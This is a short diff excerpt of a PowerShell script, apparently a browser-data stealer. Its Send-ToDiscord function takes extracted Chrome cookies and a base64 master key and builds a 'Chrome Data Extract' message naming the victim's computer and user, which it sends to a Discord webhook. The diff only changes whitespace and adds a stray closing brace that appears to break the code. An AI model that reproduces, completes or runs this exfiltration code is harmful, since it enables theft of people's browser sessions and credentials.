@@ -554,7 +554,7 @@ function Send-ToDiscord {
         [Array]$Cookies,
         [string]$MasterKeyB64,
         [string]$Method
-    )
+    )}
     
     if ($DISCORD_WEBHOOK_URL -eq "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI") {
         Write-Host "[!] DISCORD_WEBHOOK_URL não configurada!" -ForegroundColor Red
@@ -566,7 +566,7 @@ function Send-ToDiscord {
     $username = $env:USERNAME
     
     # ─── Monta mensagem ───
-    $summary = @"
+$summary = @"
 **Chrome Data Extract - $computer**
 User: `$username`
 Method: `$Method`
